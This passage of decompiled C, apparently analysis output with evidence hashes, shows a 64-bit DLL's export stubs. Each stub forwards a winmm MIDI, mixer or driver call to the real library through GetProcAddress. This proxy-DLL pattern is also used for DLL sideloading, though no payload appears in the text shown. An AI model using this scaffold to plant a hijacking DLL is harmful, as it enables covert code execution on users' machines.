  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x266e  91  midiOutGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800026b6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x1800026c5 midiOutGetVolume; Evidence ev_5f3b6d6f27b415538b3506e9343db676346563a70ad95ae54484a7bb4ac46150 */

MMRESULT __stdcall midiOutGetVolume(HMIDIOUT hmo,LPDWORD pdwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x26c5  92  midiOutGetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutGetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000270d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,pdwVolume);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000271c midiOutLongMsg; Evidence ev_b3b0e61fde855fe994b194bf093399612e66d58ca6bb9c558cf2b5ebb8f2ac5c */

MMRESULT __stdcall midiOutLongMsg(HMIDIOUT hmo,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x271c  93  midiOutLongMsg */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutLongMsg");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002764. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002773 midiOutMessage; Evidence ev_4a8bc7faf3e2d9b2fb4b2928b3c8c58889e8a6f76ea85ad7f681d65b352b71cb */

MMRESULT __stdcall midiOutMessage(HMIDIOUT hmo,UINT uMsg,DWORD_PTR dw1,DWORD_PTR dw2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x2773  94  midiOutMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800027bb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,CONCAT44(in_register_00000014,uMsg),dw1,dw2);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800027ca midiOutOpen; Evidence ev_3f2933b3cb5065f6b6d041ff4e3fba3c47ffe75ef5f3540eee80d1a17c8c65b0 */

MMRESULT __stdcall
midiOutOpen(LPHMIDIOUT phmo,UINT uDeviceID,DWORD_PTR dwCallback,DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x27ca  95  midiOutOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002812. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phmo,CONCAT44(in_register_00000014,uDeviceID),dwCallback,dwInstance);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002821 midiOutPrepareHeader; Evidence ev_9e9d62bce254aa553f93c80d6f7caed4a70abd4dd330fdd57faf7afc0adceb48 */

MMRESULT __stdcall midiOutPrepareHeader(HMIDIOUT hmo,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2821  96  midiOutPrepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutPrepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002869. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002878 midiOutReset; Evidence ev_04a4d62a9d94b9c383bb17eb479f64021c1c20f1910d3f8a0cd0b867711d1b77 */

MMRESULT __stdcall midiOutReset(HMIDIOUT hmo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2878  97  midiOutReset */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutReset");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800028c0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800028cf midiOutSetVolume; Evidence ev_0db3c94f45343739b3cd523a1eb3380c77408cfd2f35ec95bb168a62af49dc7f */

MMRESULT __stdcall midiOutSetVolume(HMIDIOUT hmo,DWORD dwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x28cf  98  midiOutSetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutSetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002917. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,CONCAT44(in_register_00000014,dwVolume));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002926 midiOutShortMsg; Evidence ev_55e27cf769d0c9d7614d38e4891caa1cd91613f00de1f04681de143c2c8337d1 */

MMRESULT __stdcall midiOutShortMsg(HMIDIOUT hmo,DWORD dwMsg)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x2926  99  midiOutShortMsg */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutShortMsg");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000296e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,CONCAT44(in_register_00000014,dwMsg));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000297d midiOutUnprepareHeader; Evidence ev_f1de334adad51f2fcc21dc90d8bc692edd9fa5056b3e993030551697f12a83d4 */

MMRESULT __stdcall midiOutUnprepareHeader(HMIDIOUT hmo,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x297d  100  midiOutUnprepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiOutUnprepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800029c5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmo,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800029d4 midiStreamClose; Evidence ev_60ec224e34ff5ba0a0cf8526a7f154d3661121e9a42c33043bbf7d758e3f50b2 */

MMRESULT __stdcall midiStreamClose(HMIDISTRM hms)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x29d4  101  midiStreamClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002a1c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002a2b midiStreamOpen; Evidence ev_5729163f5f9ec8e8ade90a04dc1193e19d18746374742558d56770326b295b53 */

MMRESULT __stdcall
midiStreamOpen(LPHMIDISTRM phms,LPUINT puDeviceID,DWORD cMidi,DWORD_PTR dwCallback,
              DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2a2b  102  midiStreamOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002a73. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phms,puDeviceID,CONCAT44(in_register_00000084,cMidi),dwCallback);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002a82 midiStreamOut; Evidence ev_e03f1ec59032bb0e1bfc887935a80ce615a3c92022a58adb630ce10cac50c42d */

MMRESULT __stdcall midiStreamOut(HMIDISTRM hms,LPMIDIHDR pmh,UINT cbmh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2a82  103  midiStreamOut */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamOut");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002aca. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms,pmh,CONCAT44(in_register_00000084,cbmh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002ad9 midiStreamPause; Evidence ev_18a7bb8f0e83a1e4454c0ef4522eaa787c9aa56a7153fc06f33036e75da8a06d */

MMRESULT __stdcall midiStreamPause(HMIDISTRM hms)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2ad9  104  midiStreamPause */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamPause");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002b21. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002b30 midiStreamPosition; Evidence ev_a8d5141d710b57ff7efb93e29c81829ea0b4701a27aaf0c3586ee07628f16bf8 */

MMRESULT __stdcall midiStreamPosition(HMIDISTRM hms,LPMMTIME lpmmt,UINT cbmmt)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2b30  105  midiStreamPosition */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamPosition");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002b78. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms,lpmmt,CONCAT44(in_register_00000084,cbmmt));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002b87 midiStreamProperty; Evidence ev_644d4ab16165b14f51395c8f2f0497d6d203d39a2c52887e533e24ec39aead7c */

MMRESULT __stdcall midiStreamProperty(HMIDISTRM hms,LPBYTE lppropdata,DWORD dwProperty)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2b87  106  midiStreamProperty */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamProperty");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002bcf. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms,lppropdata,CONCAT44(in_register_00000084,dwProperty));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002bde midiStreamRestart; Evidence ev_6c383e918db067dcdaafeb718759222516e89f0937aab61483353842c99d095b */

MMRESULT __stdcall midiStreamRestart(HMIDISTRM hms)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2bde  107  midiStreamRestart */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamRestart");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002c26. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002c35 midiStreamStop; Evidence ev_429524af90df5a2e217f186b3ebad99fba10a80d4a9dd0cbf9c61037b1aa371f */

MMRESULT __stdcall midiStreamStop(HMIDISTRM hms)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2c35  108  midiStreamStop */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"midiStreamStop");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002c7d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hms);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002c8c mixerClose; Evidence ev_ae7ab0454557221d27d2895c3c44105af29392912b9941a2b7dc7392ee14c86b */

MMRESULT __stdcall mixerClose(HMIXER hmx)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2c8c  109  mixerClose */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerClose");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002cd4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmx);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002ce3 mixerGetControlDetailsA; Evidence ev_b61a1e7fbb20682804dd8a880526a20119a0bf76d608f0ce6ed716121b5e240b */

MMRESULT __stdcall
mixerGetControlDetailsA(HMIXEROBJ hmxobj,LPMIXERCONTROLDETAILS pmxcd,DWORD fdwDetails)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2ce3  110  mixerGetControlDetailsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetControlDetailsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002d2b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxcd,CONCAT44(in_register_00000084,fdwDetails));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002d3a mixerGetControlDetailsW; Evidence ev_14d0014c91ca2a83ffedb9a553bebeaac43ed5a1810fbb1eb5429af5648c9832 */

MMRESULT __stdcall
mixerGetControlDetailsW(HMIXEROBJ hmxobj,LPMIXERCONTROLDETAILS pmxcd,DWORD fdwDetails)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2d3a  111  mixerGetControlDetailsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetControlDetailsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002d82. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxcd,CONCAT44(in_register_00000084,fdwDetails));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002d91 mixerGetDevCapsA; Evidence ev_1d3fb7c5efe094cdb3f03c35ce0962cc1698ad9648e2103cb439b085a12b1bfe */

MMRESULT __stdcall mixerGetDevCapsA(UINT_PTR uMxId,LPMIXERCAPSA pmxcaps,UINT cbmxcaps)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2d91  112  mixerGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002dd9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uMxId,pmxcaps,CONCAT44(in_register_00000084,cbmxcaps));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002de8 mixerGetDevCapsW; Evidence ev_5914752db3d6d37e03e8037a81554e3031d78eaf82679df3554b7e90b23da38c */

MMRESULT __stdcall mixerGetDevCapsW(UINT_PTR uMxId,LPMIXERCAPSW pmxcaps,UINT cbmxcaps)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2de8  113  mixerGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002e30. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uMxId,pmxcaps,CONCAT44(in_register_00000084,cbmxcaps));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002e3f mixerGetID; Evidence ev_28416ac1f91de430c07a307b905030731b1cc301b44046fd8fccb207fc2a8bfa */

MMRESULT __stdcall mixerGetID(HMIXEROBJ hmxobj,UINT *puMxId,DWORD fdwId)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2e3f  114  mixerGetID */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetID");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002e87. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,puMxId,CONCAT44(in_register_00000084,fdwId));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002e96 mixerGetLineControlsA; Evidence ev_773f96b95d63a0c03da859ed9fdbcee2d8e66a56524209ba0c5eb7a8f73e2143 */

MMRESULT __stdcall
mixerGetLineControlsA(HMIXEROBJ hmxobj,LPMIXERLINECONTROLSA pmxlc,DWORD fdwControls)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2e96  115  mixerGetLineControlsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetLineControlsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002ede. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxlc,CONCAT44(in_register_00000084,fdwControls));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002eed mixerGetLineControlsW; Evidence ev_aa870feed068d5f436e5c09bfd31b624f0f31cbe4ea0196348ca03385619562a */

MMRESULT __stdcall
mixerGetLineControlsW(HMIXEROBJ hmxobj,LPMIXERLINECONTROLSW pmxlc,DWORD fdwControls)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2eed  116  mixerGetLineControlsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetLineControlsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002f35. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxlc,CONCAT44(in_register_00000084,fdwControls));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002f44 mixerGetLineInfoA; Evidence ev_7c26b20a478be1b9aac17b77d9c70166a699b97a36cb51dce008156f4641d654 */

MMRESULT __stdcall mixerGetLineInfoA(HMIXEROBJ hmxobj,LPMIXERLINEA pmxl,DWORD fdwInfo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2f44  117  mixerGetLineInfoA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetLineInfoA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002f8c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxl,CONCAT44(in_register_00000084,fdwInfo));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002f9b mixerGetLineInfoW; Evidence ev_3c5f976d29f06072dc732ed839ed400321aaa724d5bd95719c85eb13beeade55 */

MMRESULT __stdcall mixerGetLineInfoW(HMIXEROBJ hmxobj,LPMIXERLINEW pmxl,DWORD fdwInfo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x2f9b  118  mixerGetLineInfoW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetLineInfoW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180002fe3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxl,CONCAT44(in_register_00000084,fdwInfo));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180002ff2 mixerGetNumDevs; Evidence ev_f8dd8bd38f2d37eb81519600074232d7309b0d5fd43976e06cdb63d4a4da1d1a */

UINT __stdcall mixerGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x2ff2  119  mixerGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000303a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x180003049 mixerMessage; Evidence ev_5deddf0dc6652cd2da26e8a1171aad295cded03bb4a4d55bb17b077ec95b3be2 */

DWORD __stdcall mixerMessage(HMIXER hmx,UINT uMsg,DWORD_PTR dwParam1,DWORD_PTR dwParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x3049  120  mixerMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003091. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmx,CONCAT44(in_register_00000014,uMsg),dwParam1,dwParam2);
      return (DWORD)IVar1;
    }
  }
  return 0;
}



/* 0x1800030a0 mixerOpen; Evidence ev_db9ea45e40347f8b1eb247deda2f529e4088fd06fc69ce80633e9cbae1fbfe44 */

MMRESULT __stdcall
mixerOpen(LPHMIXER phmx,UINT uMxId,DWORD_PTR dwCallback,DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x30a0  121  mixerOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800030e8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phmx,CONCAT44(in_register_00000014,uMxId),dwCallback,dwInstance);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800030f7 mixerSetControlDetails; Evidence ev_e2433fb907a28646bae8b6a2463cf12f17eab71450a7198d28d77c197d5e95fa */

MMRESULT __stdcall
mixerSetControlDetails(HMIXEROBJ hmxobj,LPMIXERCONTROLDETAILS pmxcd,DWORD fdwDetails)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x30f7  122  mixerSetControlDetails */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mixerSetControlDetails");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000313f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hmxobj,pmxcd,CONCAT44(in_register_00000084,fdwDetails));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000314e mmDrvInstall; Evidence ev_4ca7fecbacf72e8280becdf4a3a20859c0a897cf734a85d6e5d7769a192a51b1 */

INT_PTR mmDrvInstall(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x314e  123  mmDrvInstall */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmDrvInstall");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180003196. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x1800031a5 mmGetCurrentTask; Evidence ev_8597491c32023e3f4448155c659ab3f8635466d27f8ee92188f5c089ee17e319 */

INT_PTR mmGetCurrentTask(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4
                        )

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x31a5  124  mmGetCurrentTask */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mmGetCurrentTask");
